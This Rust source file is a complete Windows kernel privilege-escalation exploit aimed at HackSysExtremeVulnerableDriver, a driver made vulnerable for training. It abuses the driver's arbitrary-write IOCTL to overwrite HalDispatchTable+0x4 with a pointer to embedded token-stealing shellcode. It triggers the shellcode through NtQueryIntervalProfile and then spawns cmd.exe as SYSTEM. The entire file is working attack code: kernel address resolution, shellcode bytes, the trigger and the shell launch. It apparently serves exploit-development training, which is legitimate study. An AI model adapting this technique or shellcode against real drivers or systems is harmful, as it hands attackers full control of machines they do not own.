use std::{
    ffi::{c_void, CString},
    mem::size_of,
    ptr::{copy_nonoverlapping, null, null_mut},
};

use windows_sys::Win32::{
    Foundation::{
        CloseHandle, GetLastError, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE,
    },
    Storage::FileSystem::{CreateFileA, OPEN_EXISTING},
    System::{
        Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32,
            TH32CS_SNAPPROCESS,
        },
        LibraryLoader::{
            GetProcAddress, LoadLibraryA, LoadLibraryExA, DONT_RESOLVE_DLL_REFERENCES,
        },
        Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
        ProcessStatus::{EnumDeviceDrivers, GetDeviceDriverBaseNameA},
        Threading::{
            CreateProcessA, OpenProcess, CREATE_NEW_CONSOLE, PROCESS_ALL_ACCESS,
            PROCESS_INFORMATION, STARTUPINFOA,
        },
        IO::DeviceIoControl,
    },
};

const IOCTL_ARBITRARY_OVERWRITE: u32 = 0x0022200B;
const DEVICE_NAME: &str = "\\\\.\\HackSysExtremeVulnerableDriver";

#[derive(Debug, Clone, Copy)]
pub struct WriteWhatWhere {
    what_value: *mut c_void,
    where_value: *mut c_void,
}

fn main() {
    println!(
        "### Windows Kernel Exploitation - Arbitrary Overwrite (Write-What-Where) by memN0ps ###"
    );
    println!("[+] Preparing Ring0 Payload");

    /* Generate payload */
    let ring0_payload_addy = match setup_payload() {
        Ok(payload) => payload,
        Err(e) => panic!("[-] Failed to setup payload: {}", e),
    };

    let ring0_payload_ptr_addy = &ring0_payload_addy as *const _ as *const c_void;
    println!(
        "\t[*] Ring0 Payload Address (VirtualAlloc): {:p}",
        ring0_payload_addy
    );
    println!(
        "\t[*] Ring0 Payload Pointer Address (Ptr to VirtualAlloc Memory): {:p}",
        ring0_payload_ptr_addy
    );

    println!("[+] Gathering Kernel Information");

    let ntoskrnl_kernel_addy = match get_kernel_base_address("ntoskrnl.exe") {
        Ok(address) => address,
        Err(e) => panic!("[-] Failed to get ntoskrnl.exe base address: {}", e),
    };

    println!("\t[*] Loaded Kernel: ntoskrnl.exe");
    println!("\t[*] Base Address: {:#x}", ntoskrnl_kernel_addy);

    println!("[+] Resolving HalDispatchTable");

    let (ntoskrnl_user_addy, mut hal_dispatch_address) =
        match get_hal_dispatch_table("ntoskrnl.exe\0", "HalDispatchTable\0") {
            Ok((ntoskrnl_addy, hal_addy)) => (ntoskrnl_addy, hal_addy),
            Err(e) => panic!("[-] Failed to get HalDispatch table address: {}", e),
        };

    println!(
        "\t[*] User Mode HalDispatchTable Address: {:#x}",
        hal_dispatch_address
    );

    /* Subtract ntoskrnl base in user mode to get the offset */
    hal_dispatch_address -= ntoskrnl_user_addy as u64;
    println!("\t[*] HalDispatchTable Offset: {:#x}", hal_dispatch_address);

    /* To find HalDispatchTable address in kernel land add the base of ntoskrnl in kernel land */
    hal_dispatch_address += ntoskrnl_kernel_addy as u64;
    println!(
        "\t[*] Kernel Mode HalDispatchTable Address: {:#x}",
        hal_dispatch_address
    );

    /* Add + 0x4 to find HalDispatchTable+0x4 */
    let hal_dispatch_address_plus_4 = hal_dispatch_address + 0x4;
    println!(
        "\t[*] HalDispatchTable + 0x4: {:#x}",
        hal_dispatch_address_plus_4
    );

    /* Prepare the buffer that needs to be sent to the */
    println!("[+] Write-What-Where Structure");
    let write_what_where = WriteWhatWhere {
        what_value: ring0_payload_ptr_addy as _,
        where_value: hal_dispatch_address_plus_4 as _,
    };

    let write_what_where_ptr = &write_what_where as *const _ as *const c_void;
    let buffer_size: u32 = size_of::<WriteWhatWhere>() as u32;
    println!("\t[*] What: {:p}", write_what_where.what_value);
    println!("\t[*] Where: {:p}", write_what_where.where_value);

    /* Get a handle to the vulnerable kernel driver */
    println!("[+] Opening Vulnerable Device: {}", DEVICE_NAME);
    let device_handle = get_device_handle();
    println!("\t[*] Device Handle: {:#x}", device_handle);

    /* Send the control code with buffer to the vulnerable driver */
    println!("[+] Triggering Arbitrary Memory Overwrite");
    println!("\t[*] Sending IOCTL Code: {:#x}", IOCTL_ARBITRARY_OVERWRITE);
    println!("\t[*] Buffer Length: {}", buffer_size);
    println!("\t[*] Buffer: {:?}", write_what_where);

    match send_io_control(
        device_handle,
        IOCTL_ARBITRARY_OVERWRITE,
        write_what_where_ptr as _,
        buffer_size,
    ) {
        Ok(_) => println!("\t[*] Successfully Sent IOCTL"),
        Err(e) => panic!("[-] Failed to send IOCTL: {}", e),
    };

    println!("[+] Triggering Ring0 Payload");

    /* Trigger payload by calling NtQueryIntervalProfile inside ntdll.dll */
    match trigger_payload("NtQueryIntervalProfile\0") {
        Ok(_) => println!("\t[*] Successfully Triggered Payload"),
        Err(e) => panic!("[-] Failed to trigger payload: {}", e),
    }

    /* If we are here, it means that we've survived a BSOD */
    println!("[+] Checking Current Process Privileges");

    let _csrss_handle = match is_elevated("csrss.exe") {
        Ok(_) => println!("\t[*] Successfully Elevated Privileges"),
        Err(e) => panic!("[-] Current Process is not Elevated: {}", e),
    };

    /* we have successfully elevated our privileges */
    println!("[+] Spawning CMD with SYSTEM privilege");
    let _pid = match spawn_shell() {
        Ok(_) => println!("\t[*] Successfully Spawned CMD with NT AUTHORITY\\SYSTEM Privilege"),
        Err(e) => panic!("[-] Failed to spawn CMD: {}", e),
    };

    println!("[+] W00TW00T NT AUTHORITY\\SYSTEM");
}

/// Get a handle to the HackSysExtremeVulnerableDriver
/// returns a handle to the HackSysExtremeVulnerableDriver device
fn get_device_handle() -> isize {
    /*  Creates or opens a file or I/O device. */
    // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/Storage/FileSystem/fn.CreateFileA.html
    let device_handle = unsafe {
        CreateFileA(
            DEVICE_NAME.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            null(),
            OPEN_EXISTING,
            0,
            0,
        )
    };

    if device_handle == 0 {
        panic!("[-] Error getting device handle: {:#x}", unsafe {
            GetLastError()
        });
    }

    return device_handle;
}

/// Generate the ring0 payload and allocate memory for it
fn setup_payload() -> Result<*mut c_void, String> {
    let shellcode: Vec<u8> = vec![
        0x90, 0x50, // push rax
        0x51, // push rcx
        0x52, // push rdx
        0x48, 0x31, 0xc0, // xor rax,rax
        0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00, // mov rax,[gs:rax+0x188]
        0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, // mov rax,[rax+0xb8]
        0x48, 0x89, 0xc1, // mov rcx,rax
        0xba, 0x04, 0x00, 0x00, 0x00, // mov edx,0x4
        0x48, 0x8b, 0x80, 0xf0, 0x02, 0x00, 0x00, // mov rax,[rax+0x2f0]
        0x48, 0x2d, 0xf0, 0x02, 0x00, 0x00, // sub rax,0x2f0
        0x48, 0x39, 0x90, 0xe8, 0x02, 0x00, 0x00, // cmp [rax+0x2e8],rdx
        0x75, 0xea, // jnz 0x1d
        0x48, 0x8b, 0x90, 0x60, 0x03, 0x00, 0x00, // mov rdx,[rax+0x360]
        0x48, 0x89, 0x91, 0x60, 0x03, 0x00, 0x00, // mov [rcx+0x360],rdx
        0x5a, // pop rdx
        0x59, // pop rcx
        0x58, // pop rax
    ];

    // Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process.
    // Memory allocated by this function is automatically initialized to zero.
    // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/System/Memory/fn.VirtualAlloc.html
    let shellcode_memory = unsafe {
        VirtualAlloc(
            null_mut(),
            shellcode.len(),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if shellcode_memory.is_null() {
        return Err(format!("[-] Error allocating memory: {:#x}", unsafe {
            GetLastError()
        }));
    }

    unsafe {
        copy_nonoverlapping(shellcode.as_ptr(), shellcode_memory as _, shellcode.len());
    }

    Ok(shellcode_memory)
}

/// Get the base address of ntoskrnl.exe
/// returns the kernel-land base address of ntoskrnl.exe
fn get_kernel_base_address(name: &str) -> Result<usize, String> {
    let mut module_base = 0;
    let mut needed: u32 = 0;
    let mut name_buffer = vec![0u8; 256];

    // To determine how many device drivers were enumerated by the call to EnumDeviceDrivers,
    // divide the resulting value in the lpcbNeeded parameter by sizeof(LPVOID).
    /* Retrieves the load address for each device driver in the system. */
    // https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/System/ProcessStatus/fn.EnumDeviceDrivers.html
    unsafe { EnumDeviceDrivers(null_mut(), 0, &mut needed) };

    let mut address_list = vec![0usize; needed as usize / size_of::<usize>()];
    /* Retrieves the load address for each device driver in the system. */
    // https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/System/ProcessStatus/fn.EnumDeviceDrivers.html
    let result = unsafe { EnumDeviceDrivers(address_list.as_mut_ptr() as _, needed, &mut needed) };

    if result == 0 {
        return Err(format!("[-] Error getting device drivers: {:#x}", unsafe {
            GetLastError()
        }));
    }

    for address in address_list.into_iter() {
        /* Retrieves the base name of the specified device driver. */
        // https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getdevicedriverbasenamea
        // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/System/ProcessStatus/fn.GetDeviceDriverBaseNameA.html
        let length = unsafe {
            GetDeviceDriverBaseNameA(
                address as _,
                name_buffer.as_mut_ptr(),
                name_buffer.len() as u32,
            )
        };

        if name == std::str::from_utf8(&name_buffer[..length as _]).unwrap() {
            module_base = address as usize;
            break;
        }
    }

    return Ok(module_base);
}

/// Load ntoskrnl.exe in user-land get the address of the HalDispatchTable
/// returns the user-land base address of ntoskrnl.exe and HalDispatchTable
fn get_hal_dispatch_table(
    kernel_base_name: &str,
    function_name: &str,
) -> Result<(isize, u64), String> {
    // Loads the specified module into the address space of the calling process. The specified module may cause other modules to be loaded.
    // https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/System/LibraryLoader/fn.LoadLibraryExA.html
    let h_module =
        unsafe { LoadLibraryExA(kernel_base_name.as_ptr(), 0, DONT_RESOLVE_DLL_REFERENCES) };

    if h_module == 0 {
        return Err(format!("[-] Error loading module: {:#x}", unsafe {
            GetLastError()
        }));
    }

    // Retrieves the address of an exported function (also known as a procedure) or variable from the specified dynamic-link library (DLL).
    // https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/System/LibraryLoader/fn.GetProcAddress.html
    let function_address = unsafe { GetProcAddress(h_module, function_name.as_ptr()) };

    if function_address.is_none() {
        return Err(format!(
            "[-] Error getting function address: {:#x}",
            unsafe { GetLastError() }
        ));
    }

    return Ok((h_module, function_address.unwrap() as u64));
}

/// Send the IOCTL to the vulnerable driver
fn send_io_control(
    device_handle: HANDLE,
    ioctl: u32,
    buffer: *mut c_void,
    buffer_size: u32,
) -> Result<(), String> {
    let mut bytes_returned = 0;

    /* Sends a control code directly to a specified device driver, causing the corresponding device to perform the corresponding operation. */
    // https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/System/IO/fn.DeviceIoControl.html
    let result = unsafe {
        DeviceIoControl(
            device_handle,
            ioctl,
            buffer,
            buffer_size,
            null_mut(),
            0,
            &mut bytes_returned,
            null_mut(),
        )
    };

    if result == 0 {
        return Err(format!("[-] Error sending IOCTL: {:#x}", unsafe {
            GetLastError()
        }));
    }

    println!("\t[*] Closing Device Handle");

    /* Closes an open object handle. */
    // https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/Foundation/fn.CloseHandle.html
    if unsafe { CloseHandle(device_handle) } == 0 {
        return Err(format!("[-] Error closing device handle: {:#x}", unsafe {
            GetLastError()
        }));
    }

    Ok(())
}

/// Get the address of NtQueryIntervalProfile
fn get_nt_query_interval_profile_address(function_name: &str) -> Result<u64, String> {
    // Loads the specified module into the address space of the calling process. The specified module may cause other modules to be loaded.
    // https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/System/LibraryLoader/fn.LoadLibraryA.html
    let h_ntdll = unsafe { LoadLibraryA("ntdll.dll\0".as_ptr()) };

    if h_ntdll == 0 {
        return Err(format!("[-] Error loading module: {:#x}", unsafe {
            GetLastError()
        }));
    }

    // Retrieves the address of an exported function (also known as a procedure) or variable from the specified dynamic-link library (DLL).
    // https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/System/LibraryLoader/fn.GetProcAddress.html
    let function_address = unsafe { GetProcAddress(h_ntdll, function_name.as_ptr()) };

    if function_address.is_none() {
        return Err(format!(
            "[-] Error getting function address: {:#x}",
            unsafe { GetLastError() }
        ));
    }

    return Ok(function_address.unwrap() as u64);
}

fn trigger_payload(function_name: &str) -> Result<(), String> {
    /* This function obtains the profile interval that is currently set for a given profile source. */
    // Undocumented: https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/profile/queryinterval.htm
    // Undocumented: fn NtQueryIntervalProfile(ProfileSource: KPROFILE_SOURCE, Interval: PULONG) -> NTSTATUS;
    let p_nt_query_interval_profile = match get_nt_query_interval_profile_address(function_name) {
        Ok(address) => address,
        Err(e) => return Err(e),
    };

    println!(
        "\t[*] NtQueryIntervalProfile Address: {:#x}",
        p_nt_query_interval_profile
    );

    /* Trigger the ring0 payload */
    type NtQueryIntervalProfileType =
        extern "system" fn(profile_source: u32, interval: *mut u32) -> u32;
    #[allow(non_snake_case)]
    let NtQueryIntervalProfile: NtQueryIntervalProfileType =
        unsafe { std::mem::transmute(p_nt_query_interval_profile) };
    NtQueryIntervalProfile(0x1337, null_mut());

    return Ok(());
}

fn is_elevated(process_name: &str) -> Result<isize, String> {
    let pid = match get_process_id_by_name(&process_name) {
        Ok(pid) => pid,
        Err(e) => return Err(e),
    };

    println!("\t[*] Process ID: {}", pid);

    let h_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };

    if h_process == 0 {
        return Err(format!("Failed to open process: {:#x}", unsafe {
            GetLastError()
        }));
    }

    return Ok(h_process);
}

/// Gets the process ID by name, take process name as a parameter
pub fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
    // Takes a snapshot of the specified processes, as well as the heaps, modules, and threads used by these processes.
    // https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/System/Diagnostics/ToolHelp/fn.CreateToolhelp32Snapshot.html
    let h_snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };

    if h_snapshot == INVALID_HANDLE_VALUE {
        return Err(format!("Failed to create snapshot {:#x}", unsafe {
            GetLastError()
        }));
    }

    let mut process_entry: PROCESSENTRY32 = unsafe { std::mem::zeroed::<PROCESSENTRY32>() };
    process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

    // Retrieves information about the first process encountered in a system snapshot.
    // https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/System/Diagnostics/ToolHelp/fn.Process32First.html
    if unsafe { Process32First(h_snapshot, &mut process_entry) } == 0 {
        return Err(format!("Failed to get first process: {:#x}", unsafe {
            GetLastError()
        }));
    }

    loop {
        if c_to_rust_str(process_entry.szExeFile.to_vec()).to_lowercase()
            == process_name.to_lowercase()
        {
            break;
        }

        // Retrieves information about the next process recorded in a system snapshot.
        // https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next
        // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/System/Diagnostics/ToolHelp/fn.Process32Next.html
        if unsafe { Process32Next(h_snapshot, &mut process_entry) } == 0 {
            return Err(format!("Failed to get next process: {:#x}", unsafe {
                GetLastError()
            }));
        }
    }

    return Ok(process_entry.th32ProcessID);
}

/// Converts a C null terminated String to a Rust String
pub fn c_to_rust_str(buffer: Vec<u8>) -> String {
    let mut rust_string: Vec<u8> = Vec::new();
    for char in buffer {
        if char == 0 {
            break;
        }
        rust_string.push(char as _);
    }
    String::from_utf8(rust_string).unwrap()
}

/// Creates a new process console cmd.exe which runs in the security context of the calling process.
fn spawn_shell() -> Result<PROCESS_INFORMATION, String> {
    let lp_application_name: *const u8 = null_mut();
    let lp_command_line = CString::new("C:\\Windows\\System32\\cmd.exe")
        .expect("Failed to create C string")
        .into_raw();
    let mut startup_info = unsafe { std::mem::zeroed::<STARTUPINFOA>() };
    let mut process_information = unsafe { std::mem::zeroed::<PROCESS_INFORMATION>() };

    // Creates a new process and its primary thread. The new process runs in the security context of the calling process.
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/System/Threading/fn.CreateProcessA.html
    let create_process_result = unsafe {
        CreateProcessA(
            lp_application_name,
            lp_command_line as _,
            null_mut(),
            null_mut(),
            1,
            CREATE_NEW_CONSOLE,
            null_mut(),
            null_mut(),
            &mut startup_info,
            &mut process_information,
        )
    };

    if create_process_result == 0 {
        return Err(format!("Failed to create process: {:#x}", unsafe {
            GetLastError()
        }));
    }

    return Ok(process_information);
}
